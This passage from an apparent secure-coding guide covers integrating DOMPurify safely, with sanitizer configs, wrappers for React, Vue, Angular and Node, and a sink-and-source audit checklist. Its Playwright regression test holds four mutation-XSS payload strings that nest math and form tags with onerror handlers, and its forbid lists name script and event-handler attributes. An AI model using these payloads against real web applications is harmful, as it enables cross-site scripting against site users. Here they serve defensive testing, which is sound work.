- [ ] Automated dependency updates (Dependabot/Renovate)
- [ ] Quarterly re-audit scheduled

---

## Secure Integration Patterns

### Minimal Secure Wrapper

```javascript
const SANITIZE_CONFIG = Object.freeze({
  USE_PROFILES: { html: true },
  FORBID_TAGS: ['style'],
  FORBID_ATTR: ['style'],
  ALLOW_DATA_ATTR: false,
  ALLOW_UNKNOWN_PROTOCOLS: false,
  SAFE_FOR_XML: true,
});

function sanitizeHTML(dirty) {
  const input = String(dirty ?? '');
  try {
    return DOMPurify.sanitize(input, SANITIZE_CONFIG);
  } catch (error) {
    console.error('[sanitizeHTML] DOMPurify error:', error);
    return ''; // NEVER return raw input on error
  }
}
```

### Maximum Security Config

```javascript
const MAX_SECURITY_CONFIG = Object.freeze({
  ALLOWED_TAGS: ['p', 'br', 'b', 'i', 'u', 'strong', 'em', 'a', 'ul', 'ol', 'li',
                  'h1', 'h2', 'h3', 'h4', 'h5', 'h6', 'blockquote', 'pre', 'code'],
  ALLOWED_ATTR: ['href', 'title', 'class'],
  FORBID_TAGS: ['style', 'svg', 'math', 'form', 'input', 'script', 'template'],
  FORBID_ATTR: ['style', 'onerror', 'onload', 'onclick', 'onfocus', 'onblur'],
  ALLOW_DATA_ATTR: false,
  ALLOW_UNKNOWN_PROTOCOLS: false,
  SAFE_FOR_XML: true,
  SANITIZE_NAMED_PROPS: true,
});
```

### Framework Safe Patterns

**React:**
```typescript
const SANITIZE_CONFIG = Object.freeze({ USE_PROFILES: { html: true }, ALLOW_DATA_ATTR: false });
export const useSanitizedHtml = (dirty: string): { __html: string } =>
  useMemo(() => ({ __html: DOMPurify.sanitize(String(dirty ?? ''), SANITIZE_CONFIG) }), [dirty]);
```

**Vue:**
```typescript
export const vSanitizedHtml: Directive<HTMLElement, string> = {
  mounted(el, binding) { el.innerHTML = DOMPurify.sanitize(String(binding.value ?? ''), SANITIZE_CONFIG); },
  updated(el, binding) {
    if (binding.value !== binding.oldValue)
      el.innerHTML = DOMPurify.sanitize(String(binding.value ?? ''), SANITIZE_CONFIG);
  },
};
```

**Angular:**
```typescript
@Pipe({ name: 'sanitize', pure: true })
export class SanitizePipe implements PipeTransform {
  constructor(private domSanitizer: DomSanitizer) {}
  transform(value: string): SafeHtml {
    const clean = DOMPurify.sanitize(String(value ?? ''), SANITIZE_CONFIG);
    return this.domSanitizer.bypassSecurityTrustHtml(clean);
  }
}
```

**Server-side Node.js:**
```javascript
function serverSanitize(dirty) {
  const window = new JSDOM('').window; // per-request instance
  const DOMPurify = createDOMPurify(window);
  return DOMPurify.sanitize(String(dirty ?? ''), config);
}
// ALWAYS re-sanitize on client -- server sanitization alone is insufficient
```

---

## Browser-Based Regression Testing

```javascript
// Critical: test sanitize + re-parse + DOM inspection (not just string output)
test('mXSS payload does not execute', async ({ page }) => {
  const payloads = [
    '<form><math><mtext></form><form><mglyph><style></math><img src onerror=x>',
    '<math><mtext><table><mglyph><style><!--</style><img src onerror=x>',
    '<select><option><img src=x onerror="alert(1)"></option><selectedcontent></selectedcontent></select>',
    '<form><math><mtext></form><form><mglyph><textarea></math><img src onerror=x>',
  ];
  for (const payload of payloads) {
    const count = await page.evaluate((p) => {
      const sanitized = DOMPurify.sanitize(p);
      const el = document.createElement('div');
      el.innerHTML = sanitized; // triggers browser re-parse
      return el.querySelectorAll('script, [onerror], [onclick], [onload]').length;
    }, payload);
    expect(count).toBe(0);
  }
});
```

**Playwright matrix (required -- jsdom is insufficient for mXSS testing):**
```javascript
module.exports = {
  projects: [
    { name: 'chromium', use: { browserName: 'chromium' } },
    { name: 'firefox',  use: { browserName: 'firefox'  } },
    { name: 'webkit',   use: { browserName: 'webkit'   } },
  ],
};
```

---

## HTML Sink and Source Quick Reference

### HTML Sinks

| Sink | Framework | Search Pattern |
|------|-----------|---------------|
| `element.innerHTML = ...` | Vanilla JS | `\.innerHTML\s*=` |
| `element.outerHTML = ...` | Vanilla JS | `\.outerHTML\s*=` |
| `element.insertAdjacentHTML(...)` | Vanilla JS | `insertAdjacentHTML` |
| `document.write(...)` | Vanilla JS | `document\.write` |
| `dangerouslySetInnerHTML={{__html:...}}` | React | `dangerouslySetInnerHTML` |
| `v-html="..."` | Vue | `v-html` |
| `sanitizer.bypassSecurityTrustHtml(...)` | Angular | `bypassSecurityTrustHtml` |
| `{@html ...}` | Svelte | `{@html` |
| `$(...).html(...)` | jQuery | `\.html\(` |

### Source-to-Sink Verification Steps

1. Identify all HTML sinks via grep patterns
2. Trace data backward to source (URL params, API responses, localStorage, postMessage, clipboard)
3. Verify DOMPurify is called on EVERY code path (check try/catch, if/else, ternary branches)
4. Verify configuration is secure (no ALLOW_UNKNOWN_PROTOCOLS, USE_PROFILES enabled, FORBID set)
5. Verify NO post-sanitization transforms between DOMPurify and sink
6. Verify context matching (HTML body = default, SVG = USE_PROFILES, templates = SAFE_FOR_TEMPLATES)
7. Verify RETURN_DOM_FRAGMENT where possible
8. Run mXSS regression payloads in real browsers via Playwright (not jsdom)
